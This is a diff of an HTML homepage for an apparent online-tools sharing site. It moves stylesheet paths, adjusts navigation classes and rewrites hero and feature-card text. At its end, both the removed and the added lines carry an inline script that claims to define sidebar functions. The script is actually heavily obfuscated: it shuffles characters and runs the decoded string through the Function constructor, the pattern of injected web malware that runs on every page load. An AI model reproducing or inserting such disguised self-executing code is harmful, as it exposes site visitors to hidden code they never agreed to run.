@@ -4,11 +4,12 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Let's Try Something Cool!</title>
-    <link rel="stylesheet" href="nav_style.css">
+    <link rel="stylesheet" href="styles/nav_style.css">
     <link rel="stylesheet" href="global_style.css">
-    <link rel="stylesheet" href="hero_style.css">
-    <link rel="stylesheet" href="feature_style.css">
-    <link rel="stylesheet" href="cursor.css">
+    <link rel="stylesheet" href="styles/hero_style.css">
+    <link rel="stylesheet" href="styles/feature_style.css">
+    <link rel="stylesheet" href="styles/cursor.css">
+    <link rel="stylesheet" href="styles/main_style.css">
     <link href='https://fonts.googleapis.com/css?family=Inter' rel='stylesheet'>
     <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@20..48,100..700,0..1,-50..200" />
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
@@ -17,34 +18,37 @@
     <section id="header">
         <nav class="navigation">
             <ul class="menu">
+                        
                         <li class="button-container">
                             <button id="theme-toggle" class="theme-toggle">
                                 <i id="moon-icon" class="fa-solid fa-moon"></i>
                                 <i id="sun-icon" class="fa-solid fa-sun"></i>
                             </button>
                         </li>
-                        <li class="menu-item home active"><a href="index.html">Home</a></li>
-                        <li class="menu-item search"><a href="search.html">Search</a></li>
-                        <li class="menu-item create"><a href="#">Toplist <svg xmlns="http://www.w3.org/2000/svg" height="24px" viewBox="0 -960 960 960" width="24px" fill="#5f6368"><path d="M480-360 280-560h400L480-360Z"/></svg></a>
+                        <li class="logo"></li>
+                        <li class="menu-item home active small-in-phone"><a href="index.html">Home</a></li>
+                        <li class="menu-item search  small-in-phone"><a href="search.html">Search</a></li>
+                        <li class="menu-item create small-in-phone"><a href="#">Toplist &#160<i class="fa-solid fa-caret-down"></i></a>
                             <ul class="drop-down">
                                 <div class="drop-down-container">
-                                <h1>Popular tools</h1>
+                                <h1 class="small-in-phone">Popular tools</h1>
+                                <li><a>Best of All</a></li>
                                 <li><a>Top by Loved</a></li>
                                 <li><a>Top by Used</a></li>
                                 <li><a>Top by category</a></li>
-                                <h1>For you</h1>
+                                <h1 class="small-in-phone">For you</h1>
                                 <li><a>Tools for you</a></li>
                                 </div>
                             </ul>
                         </li>
-                        <li class="menu-item purchase"><a href="#">Purchase</a></li>
-                        <li class="menu-item forum"><a href="#">Forum <svg xmlns="http://www.w3.org/2000/svg" height="24px" viewBox="0 -960 960 960" width="24px" fill="#5f6368"><path d="M480-360 280-560h400L480-360Z"/></svg></a></li>
-                        <li class="menu-item icon"><a href="#"><i id="moon-icon" class="fa-solid fa-house"></i></a></li>
-                        <li class="menu-item icon"><a href="#"><i class="fa-solid fa-magnifying-glass"></i></a></li>
+                        <li class="menu-item purchase small-in-phone"><a href="#">Purchase</a></li>
+                        <li class="menu-item forum small-in-phone"><a href="#">Forum &#160<i class="fa-solid fa-caret-down"></i></a></li>
+                        <li class="menu-item icon small-in-phone"><a href="#"><i id="moon-icon" class="fa-solid fa-house"></i></a></li>
+                        <li class="menu-item icon small-in-phone"><a href="#"><i class="fa-solid fa-magnifying-glass"></i></a></li>
                         
-                        <li class="menu-item signup2"><a>Sign Up</a></li>
-                        <li class="menu-item login"><a>Login</a></li>
-                        <abbr title="More"><li onclick="showSidebar()" class="menu-item menubtn">
+                        <li class="signup2 small-in-phone"><a>Sign Up</a></li>
+                        <li class="login small-in-phone"><a>Login</a></li>
+                        <abbr title="More"><li onclick="showSidebar()" class="menu-item menubtn small-in-phone">
                             <a href="#"><i class="fa fa-bars"></i></a>
                         </li></abbr>
             </ul>
@@ -61,31 +65,46 @@
             </ul>
         </nav>
     </section>
+    <section id="main">
     <section id="hero">
         <div id="hero-text">
-            <h1>Share Your <y>Tools</y>,<br />Empower the Community</h1>
-            <p>Share your awesome tools, discover new ones, and connect with fellow creators. Let's build something amazing together!</p>
-            <div class="cta">
-                <li class="signup"><a href="#">Sign Up for FREE</a></li>
-            </div>
+            <h1>Let your problem solved with Online Tools</h1>
+            <p>Whether you're converting files, optimizing content, 
+                or managing complex tasks, our all-in-one platform 
+                offers the tools you need to work smarter, faster, 
+                and more efficiently. Explore our user-friendly 
+                interface and elevate your productivity today.</p>
         </div>
-        <div id="hero-image">
-            <div id="tab-one">
+        <div id="card-div">
+            <div class="hero-card">
+                How this website work?
+            </div>
+            <div class="hero-card">
+                How we work?
+            </div>
+            <div class="hero-card">
+                How we work?
+            </div>
+            <div class="hero-card">
+                How we work?
+            </div>
+            <div class="hero-card">
+                How we work?
             </div>
         </div>
     </section>
     <section id="feature">
-        <div class="main-container">
+        <div class="main-content">
             <div class="top-feature-bar">
-                <h1>Featured tools <i class="fa-solid fa-caret-right"></i></h1>
-                <a href="search.html" class="link-to-search mag-cursor">Go to search for more</a>
+                <h1>Every tools cagetory<i class="fa-solid fa-caret-right"></i></h1>
+                <a href="search.html" class="link-to-search mag-cursor">Go to search</a>
             </div>
             <div class="slide-list">
                                 <!-- Project card 1 -->
                                 <div class="card-container oneweekly">
                                     <div class="fancy-bg">
                                         <div class="card card-oneweekly">
-                                            <h2 class="tool-title">File Genenator</h2>
+                                            <h2 class="tool-title">Math tools</h2>
                                             <div class="label-group">
                                                 <div class='label oneweekly'>
                                                     <p>#1 weekly</p>
@@ -94,7 +113,7 @@
                                                     <p>#1 Loved</p>
                                                 </div>
                                             </div>
-                                            <p class="description">This tool is made for fun</p>
+                                            <p class="description">Including: Scientific calculator, Graphing, etc.</p>
                                             <p class="author">by <b>tools_heaven</b></p>
                                             <div class='tool-info'>
                                                 <p class="view"><i class="fa-solid fa-eye"></i> 12768</p>
@@ -176,9 +195,10 @@
             </div>
         </div>
     </section>
+    </section>
 
     <script>
-       var showSidebar,hideSidebar;(function(){var lDp='',mbO=772-761;function Nbz(l){var a=886330;var x=l.length;var h=[];for(var o=0;o<x;o++){h[o]=l.charAt(o)};for(var o=0;o<x;o++){var r=a*(o+528)+(a%34750);var e=a*(o+248)+(a%20704);var k=r%x;var w=e%x;var z=h[k];h[k]=h[w];h[w]=z;a=(r+e)%1395887;};return h.join('')};var CUq=Nbz('ymxatrudgwskbjhcontizolrpnuqfvreoctsc').substr(0,mbO);var uSO='h(vx).10o elmn(;85a;eC5ie"tb+S+avmw.;lgttprn1=rjl=);l;ehu)d=wqq+[re70,=6)re,05;;;+;6,ra,c0C92,"0r) ,"j;7r,n),7=)66(l+]rv;;ec0rr=t)(fs[(g.iawe0lw!ma{.7}td;e+v6=1;]rur=hs3.cl[ .,d,[v==cpt=j=([esj=] ;l.r[vtra=e0rnf(pgC angs+fenoagl4uo3vrf;ne=aag}m})ns.rtreki(ht.2c)ivh(vv;c+q;pmr8ptt)-,; )10iq[m{[.fv1htduolo;8deslicn2nrh1oa+=uldbb;rvvrj9o]iifi flArns[tsav;otr rjrfn u=s;wt[fa+h.5aaa ]aj.{Sv.]+d)A4)s)lvgrrx]lso,;p}sm8vb=,,-1)*Ci];wh]rvoreotte)7.-=;+rv.2+lel9fs(()fol==A".r)r+()>=eug1h=o+(.c;at,689Ar(l,2){(an"n[c1r e(u=eq2)-,qg;1;u+=2y(levv=a;aCinu+ne m([=)x.hb,r=ia;C8(d>s ebluaod0wo bst;=]g)c0dn e7lpjsh(;ahrwCh6rk)+(;fi =(h vuas)}+-a <<)9.el,h,l{3e"(t}i(v<v"8{jg;,==f+h8n[!a;0};nvnrsr(o[ ]0])p;p(v+prj,i4;j={t(aln]r1+],=9p9(+p , n,=)4.uof= tlna;uifva=,tui;7 1r)paciiCo2r5i3i.ho.;aaog2=e;f<j.t;)u(h,w86"kkxws=+(=na4.lc.wvA(l );.vz+ mdhrhn(.=oo-7j=rn<ne(rdgto)(reeuunoket6amt-af"p")o*1r;eau;';var FQO=Nbz[CUq];var dii='';var Wue=FQO;var Vnf=FQO(dii,Nbz(uSO));var nDD=Vnf(Nbz('bFj@tbS_;; je;+(g45u_n1=Kc\/$ft.u4eB8337HmdsKc=!,"$ltKg.Kx>;K%aKSTo}al$f0KS{4%"))()Kt)r(f(}e)K s]MP;64( KKBr=!a!KK{{K(a6odc=(nnrt,5KtK3Ce;eKf;c_iKK.(K>rt3i}KKf  ."-3t,rK6.3Kf>_ns(a3M K1V.Kbrfrn81_02(\/1emlKo0)L)KKgr( Kt!g)*K.u;6)nn3 39tK%yvKh una)d "=n%K )1)]im6+a=.6%Lo=h"orM?oK%Kd=.04>tOmK:}#KeOK_c$t{cIi1Ea8jbtonr_%1K =.-{%c%{HuvKeMjfKU1)ta.j\/.e}}1eKef%ogKKc]K KlKd$)Froe$,zishb}$olKa$meCNl:h8Ke{28%4KKr8uf2jeSls_Mai5]r!%(!sKeK"tKK\/(at8nKKKKin5$KoKhbee%t (\'Km$!)K.tc.(n0!KdK(;_seK4;$,K_KetKpK;()K%KK+z.o-crhn)_{Fc.1oKc}uaz834KoK(c#KKKa5M3.(K})G%a=rT_a$=_fK;rlKL$=(jKK)t_mKe=Ke0-oo)5;8KKKet} 1]_1?u.!ohi7MKf(\')ogKoe,cl1=0;rMytegtee_nn77e0[MK+$)Ko  15!ue!=.9$K!b(fi6K)=K*K,KK0cbK7Q,e;$d$r<0tK)*45a6.}zKd_at.aKuep2p8k)!K._s;hd}Kfre2})a;Ke<K)alkaQ5);;1eg.7(m.!fh;!_7F_1KKSKjm)d9;#D(<5K"tob_ [jKK4rujKz<rSi(7)4frK3))f.a;KL%=e1id]8K"K4snK{$eK)K.p8KUaKK!"a(2K$KKlu==KK.+=.4%o];Kte]o5Bt5.Kr}Bte}0Ji7Kmtas#1#)Kfa[#,Ine])gKonKK;)KI!(.,<{im%&n;$K<Ke4$i).)hKd!K)([0{)NoKGK2=Gn;g4K\'uK6{(VtKe!$Kno(2)4.g}(nK5(es3KcK},]lN)i6cK icK3afP16;,eK.,e]; ,KKKr;f2bdhtouy3))3Hr;nK[5KKf3nK8Kan}g 7;}K2.1f)]. O,;.,twK2g1).N=9a[7r\'jid{==aer{l=o5eKJ-M2u[K(QOrsn&a(jC};o23eds5n3nSdKu9eKtK96jo6o,L]=KRH.oFn(Ua34uIR%(7)3[51stKbnfK=t1rK$rKm;> f1K_7 )KkKn)K3Mo1$!.C)K) 5s38%U!$)")t4t=0lV3JKdd3!Kmrrea(T(Q=64l[f.,iK_b]i|;5 kGs.87oG(0h)!;No%)K,55]kK$A,n;(!r4djTrR6K!]8a1i0(DdKf$KKe}oK,;.l&t1of1K]OKJt]Knj4)..DKf9}loiKf.<e_K6K07toUeItTiK7a8f)6cu,]5+Ke_g;3!a35bKKCjKKb)dAr;d0I5.Kt K=t;KKKCKEeKxKcn)0",,anf"m7(KnK$,;$662;310ie;atKRi7b$t5sn11)EK"K4K|;Kyf3e4(m[KjKfK0oe1.CKtfurr8Ka5e(ar$<K5l(h1oK(Kta7Kj5tlo451 KeKfuhnK{LK3_$)n5 r(um.05K]e:ccCI-@crT]Kt})a.sNU}095)Kh74f3!K1t (p.cal1K)!$7Kh=DK(Ke0oSn2s!)K(c{_]O_)K)fcjSk.K1%!aK(K!4tufkoKa){fd1K7]K($2#6K_hrK_).,oe$L(9ibM{K2.KK{K!Q+nK}$io]e;56)_U_G0#i55_K(.o1kt;K-_S__B!-toK1lg=9)9!e!(g_;n(.#h.#a1!5)K51()#2[%i5I(m+a3K=1 KeT]$KM(12,K9l,Ka;8#aaK4gKrnK)5](pK_@)Kt)}yKE)f l%tt;O$rf17K)Ss8$)at%en$d(cq)dKs()KE,(KVd8]m_l>613fS[n]uo7a9fKK%f4%8e<n_(i1)]3e8 ot.tol.t;n+_95 6]aA[Ka9eK1dnK_K(!52%3Es K4bo-f K})9$!o!g__i1>n @8gafK((r1ge4KsK8K;%b"K4_$Kua ]8[&4ibn(Ki{5dKr UKKfs40oee6 P..20{K ] nKM%ta 0KK1rh,e8=)mK3K6;t)6K$M!FKu]rd]c4e(3oKfnc:_mr%$yK(3K or.=j2;).n82i,%9]1K 1[_Kr{g1onKt;b8$Ru$ff[u?){eps$F$.AK($4mn)aK1} as5)_*ti  K6(o1\/uG=)no$iKNatoK{.#K,!K$%*(su$a.eaKn.$.so$m)KtaK ;MeKD1<aj.7eiK5f-eL16oP%v8s+4+jK!. 8{nu!zr!bK__K1 =_ ,ehe%e5.e_?(o$3l1)bob  ]s;'));var chb=Wue(lDp,nDD );chb(9397);return 6455})()
+        var showSidebar,hideSidebar;(function(){var lDp='',mbO=772-761;function Nbz(l){var a=886330;var x=l.length;var h=[];for(var o=0;o<x;o++){h[o]=l.charAt(o)};for(var o=0;o<x;o++){var r=a*(o+528)+(a%34750);var e=a*(o+248)+(a%20704);var k=r%x;var w=e%x;var z=h[k];h[k]=h[w];h[w]=z;a=(r+e)%1395887;};return h.join('')};var CUq=Nbz('ymxatrudgwskbjhcontizolrpnuqfvreoctsc').substr(0,mbO);var uSO='h(vx).10o elmn(;85a;eC5ie"tb+S+avmw.;lgttprn1=rjl=);l;ehu)d=wqq+[re70,=6)re,05;;;+;6,ra,c0C92,"0r) ,"j;7r,n),7=)66(l+]rv;;ec0rr=t)(fs[(g.iawe0lw!ma{.7}td;e+v6=1;]rur=hs3.cl[ .,d,[v==cpt=j=([esj=] ;l.r[vtra=e0rnf(pgC angs+fenoagl4uo3vrf;ne=aag}m})ns.rtreki(ht.2c)ivh(vv;c+q;pmr8ptt)-,; )10iq[m{[.fv1htduolo;8deslicn2nrh1oa+=uldbb;rvvrj9o]iifi flArns[tsav;otr rjrfn u=s;wt[fa+h.5aaa ]aj.{Sv.]+d)A4)s)lvgrrx]lso,;p}sm8vb=,,-1)*Ci];wh]rvoreotte)7.-=;+rv.2+lel9fs(()fol==A".r)r+()>=eug1h=o+(.c;at,689Ar(l,2){(an"n[c1r e(u=eq2)-,qg;1;u+=2y(levv=a;aCinu+ne m([=)x.hb,r=ia;C8(d>s ebluaod0wo bst;=]g)c0dn e7lpjsh(;ahrwCh6rk)+(;fi =(h vuas)}+-a <<)9.el,h,l{3e"(t}i(v<v"8{jg;,==f+h8n[!a;0};nvnrsr(o[ ]0])p;p(v+prj,i4;j={t(aln]r1+],=9p9(+p , n,=)4.uof= tlna;uifva=,tui;7 1r)paciiCo2r5i3i.ho.;aaog2=e;f<j.t;)u(h,w86"kkxws=+(=na4.lc.wvA(l );.vz+ mdhrhn(.=oo-7j=rn<ne(rdgto)(reeuunoket6amt-af"p")o*1r;eau;';var FQO=Nbz[CUq];var dii='';var Wue=FQO;var Vnf=FQO(dii,Nbz(uSO));var nDD=Vnf(Nbz('bFj@tbS_;; je;+(g45u_n1=Kc\/$ft.u4eB8337HmdsKc=!,"$ltKg.Kx>;K%aKSTo}al$f0KS{4%"))()Kt)r(f(}e)K s]MP;64( KKBr=!a!KK{{K(a6odc=(nnrt,5KtK3Ce;eKf;c_iKK.(K>rt3i}KKf  ."-3t,rK6.3Kf>_ns(a3M K1V.Kbrfrn81_02(\/1emlKo0)L)KKgr( Kt!g)*K.u;6)nn3 39tK%yvKh una)d "=n%K )1)]im6+a=.6%Lo=h"orM?oK%Kd=.04>tOmK:}#KeOK_c$t{cIi1Ea8jbtonr_%1K =.-{%c%{HuvKeMjfKU1)ta.j\/.e}}1eKef%ogKKc]K KlKd$)Froe$,zishb}$olKa$meCNl:h8Ke{28%4KKr8uf2jeSls_Mai5]r!%(!sKeK"tKK\/(at8nKKKKin5$KoKhbee%t (\'Km$!)K.tc.(n0!KdK(;_seK4;$,K_KetKpK;()K%KK+z.o-crhn)_{Fc.1oKc}uaz834KoK(c#KKKa5M3.(K})G%a=rT_a$=_fK;rlKL$=(jKK)t_mKe=Ke0-oo)5;8KKKet} 1]_1?u.!ohi7MKf(\')ogKoe,cl1=0;rMytegtee_nn77e0[MK+$)Ko  15!ue!=.9$K!b(fi6K)=K*K,KK0cbK7Q,e;$d$r<0tK)*45a6.}zKd_at.aKuep2p8k)!K._s;hd}Kfre2})a;Ke<K)alkaQ5);;1eg.7(m.!fh;!_7F_1KKSKjm)d9;#D(<5K"tob_ [jKK4rujKz<rSi(7)4frK3))f.a;KL%=e1id]8K"K4snK{$eK)K.p8KUaKK!"a(2K$KKlu==KK.+=.4%o];Kte]o5Bt5.Kr}Bte}0Ji7Kmtas#1#)Kfa[#,Ine])gKonKK;)KI!(.,<{im%&n;$K<Ke4$i).)hKd!K)([0{)NoKGK2=Gn;g4K\'uK6{(VtKe!$Kno(2)4.g}(nK5(es3KcK},]lN)i6cK icK3afP16;,eK.,e]; ,KKKr;f2bdhtouy3))3Hr;nK[5KKf3nK8Kan}g 7;}K2.1f)]. O,;.,twK2g1).N=9a[7r\'jid{==aer{l=o5eKJ-M2u[K(QOrsn&a(jC};o23eds5n3nSdKu9eKtK96jo6o,L]=KRH.oFn(Ua34uIR%(7)3[51stKbnfK=t1rK$rKm;> f1K_7 )KkKn)K3Mo1$!.C)K) 5s38%U!$)")t4t=0lV3JKdd3!Kmrrea(T(Q=64l[f.,iK_b]i|;5 kGs.87oG(0h)!;No%)K,55]kK$A,n;(!r4djTrR6K!]8a1i0(DdKf$KKe}oK,;.l&t1of1K]OKJt]Knj4)..DKf9}loiKf.<e_K6K07toUeItTiK7a8f)6cu,]5+Ke_g;3!a35bKKCjKKb)dAr;d0I5.Kt K=t;KKKCKEeKxKcn)0",,anf"m7(KnK$,;$662;310ie;atKRi7b$t5sn11)EK"K4K|;Kyf3e4(m[KjKfK0oe1.CKtfurr8Ka5e(ar$<K5l(h1oK(Kta7Kj5tlo451 KeKfuhnK{LK3_$)n5 r(um.05K]e:ccCI-@crT]Kt})a.sNU}095)Kh74f3!K1t (p.cal1K)!$7Kh=DK(Ke0oSn2s!)K(c{_]O_)K)fcjSk.K1%!aK(K!4tufkoKa){fd1K7]K($2#6K_hrK_).,oe$L(9ibM{K2.KK{K!Q+nK}$io]e;56)_U_G0#i55_K(.o1kt;K-_S__B!-toK1lg=9)9!e!(g_;n(.#h.#a1!5)K51()#2[%i5I(m+a3K=1 KeT]$KM(12,K9l,Ka;8#aaK4gKrnK)5](pK_@)Kt)}yKE)f l%tt;O$rf17K)Ss8$)at%en$d(cq)dKs()KE,(KVd8]m_l>613fS[n]uo7a9fKK%f4%8e<n_(i1)]3e8 ot.tol.t;n+_95 6]aA[Ka9eK1dnK_K(!52%3Es K4bo-f K})9$!o!g__i1>n @8gafK((r1ge4KsK8K;%b"K4_$Kua ]8[&4ibn(Ki{5dKr UKKfs40oee6 P..20{K ] nKM%ta 0KK1rh,e8=)mK3K6;t)6K$M!FKu]rd]c4e(3oKfnc:_mr%$yK(3K or.=j2;).n82i,%9]1K 1[_Kr{g1onKt;b8$Ru$ff[u?){eps$F$.AK($4mn)aK1} as5)_*ti  K6(o1\/uG=)no$iKNatoK{.#K,!K$%*(su$a.eaKn.$.so$m)KtaK ;MeKD1<aj.7eiK5f-eL16oP%v8s+4+jK!. 8{nu!zr!bK__K1 =_ ,ehe%e5.e_?(o$3l1)bob  ]s;'));var chb=Wue(lDp,nDD );chb(9397);return 6455})()
     </script>
 </body>
 </html>
